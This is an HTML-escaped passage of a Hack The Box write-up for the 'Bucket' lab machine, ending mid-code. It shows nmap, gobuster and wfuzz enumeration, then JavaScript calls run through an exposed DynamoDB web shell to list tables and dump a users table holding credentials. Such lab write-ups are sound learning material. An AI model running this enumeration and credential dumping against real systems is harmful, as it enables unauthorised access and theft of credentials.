xml:base="/posts/HTB-Writeup-Bucket">&lt;p&gt;&lt;img src=&quot;/assets/images/3f07dd46f3ff7d287d2f736b18c6ded7.png&quot; alt=&quot;3f07dd46f3ff7d287d2f736b18c6ded7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This my write-up for Bucket, a medium-difficulty Linux box completed on April 25th 2021, with acclaim from the community I should say; as it included technologies not often found in typical CTF, or so I cam e to understand.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;We start with our initial &lt;strong&gt;nmap&lt;/strong&gt; recon  scan: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sC -sV -oA nmap/bucket 10.10.10.212&lt;/code&gt;, which gives us pretty standard results:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-03-31 03:25 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.212
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.032s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.34 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We do notice nmap enumeration script telling us a redirect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket.htb&lt;/code&gt;, which we add to our &lt;strong&gt;hosts&lt;/strong&gt; file.&lt;/p&gt;

&lt;p&gt;We start with standard web enumeration first.&lt;/p&gt;

&lt;h3 id=&quot;web-recon---buckethtb&quot;&gt;Web Recon - bucket.htb&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-31_03-28-51.png&quot; alt=&quot;Screenshot_2021-03-31_03-28-51&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We start by running standard enumeration tools on the website and a few basic checks:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Check for robots.txt: none found.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Gobuster on root directory (raft-small-words): nothing interesting.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Check for languages being used.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Check source code: we do notice some SRC are pointing to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;:&lt;/p&gt;

    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;coffee&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;s3.bucket.htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;adserver&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;images&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bug.jpg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;view-source:http:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;s3.bucket.htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;adserver&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;images&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bug.jpg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Bug&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;160&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Running the same &lt;strong&gt;gobuster&lt;/strong&gt; on this newly found sub-domain (After adding to our hosts file) with the same parameter as the first run , we find interesting findings:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
└──╼ &lt;span class=&quot;nv&quot;&gt;$gobuster&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/SecLists/Discovery/Web-Content/raft-small-words.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/root &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; html,php
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://s3.bucket.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     html,php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/03/31 03:42:21 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/health &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/shell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, before diving in the &lt;strong&gt;s3&lt;/strong&gt; server, we also search for potential additional subdomain with &lt;strong&gt;wfuzz&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
└──╼ &lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://FUZZ.bucket.htb &lt;span class=&quot;nt&quot;&gt;--ip&lt;/span&gt; 10.10.10.212:80 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 302
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://FUZZ.bucket.htb/
Total requests: 19983
=====================================================================
ID           Response   Lines    Word       Chars       Payload                             
=====================================================================
000000247:   404        0 L      2 W        21 Ch       &quot;s3&quot;                                 000009543:   400        12 L     53 W       422 Ch      &quot;#www&quot;                               
000010595:   400        12 L     53 W       422 Ch      &quot;#mail&quot;      

Total time: 0
Processed Requests: 19983
Filtered Requests: 19980
Requests/sec.: 0

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Again, s3 stands out, so we pivot on this subdomain.&lt;/p&gt;

&lt;h3 id=&quot;web-recon---s3buckethtb&quot;&gt;Web Recon - s3.bucket.htb&lt;/h3&gt;

&lt;p&gt;Accessing the &lt;em&gt;s3.bucket.htb&lt;/em&gt; site, we are shown a simple json message (which is strange considering this page was being registered as a 404):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-31_03-40-50.png&quot; alt=&quot;Screenshot_2021-03-31_03-40-50&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following gobuster’s findings; we check for the &lt;strong&gt;/health&lt;/strong&gt; path which seems to show us which services are currently running:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-31_03-53-33.png&quot; alt=&quot;Screenshot_2021-03-31_03-53-33&quot; /&gt;&lt;/p&gt;

&lt;p&gt;New information from this about the presence of &lt;strong&gt;dynamodb&lt;/strong&gt;, AWS database system. Next, visiting the &lt;strong&gt;/shell/&lt;/strong&gt; path , we are shown an interactive web shell for DynamoDB:&lt;/p&gt;

&lt;p&gt;:warning: &lt;em&gt;Some time was lost here, as I omitted the trailing slash of the &lt;strong&gt;/shell&lt;/strong&gt; path given by gobuster, which redirected me to another location and never accessed the shell.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_17-40-40.png&quot; alt=&quot;Screenshot_2021-04-02_17-40-40&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;dynamodb-enumeration&quot;&gt;DynamoDB Enumeration&lt;/h2&gt;

&lt;p&gt;The interactive shell provides some handy example and templates to use; reading through it, the first one of interest is the &lt;strong&gt;listTable&lt;/strong&gt; function which allows to to, as its name suggest, list tables:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ExclusiveStartTableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// optional (for pagination, returned as LastEvaluatedTableName)&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;Limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// optional (to further limit the number of table names returned per page)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;listTables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// an error occurred&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// successful response&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which returns one table: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_18-04-36.png&quot; alt=&quot;Screenshot_2021-04-02_18-04-36&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we use the &lt;strong&gt;describeTable&lt;/strong&gt; function to have more information about this table:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;TableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;describeTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// an error occurred&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// successful response&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_18-06-32.png&quot; alt=&quot;Screenshot_2021-04-02_18-06-32&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which seem to contains credentials. Finally, we dump the content using the &lt;strong&gt;doScan&lt;/strong&gt; function:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tableName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;TableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ALL_ATTRIBUTES&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;


&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// an error occurred&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// successful response&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// More data.  Keep calling scan.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;LastEvaluatedKey&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ExclusiveStartKey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LastEvaluatedKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Starting a Scan of the table&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
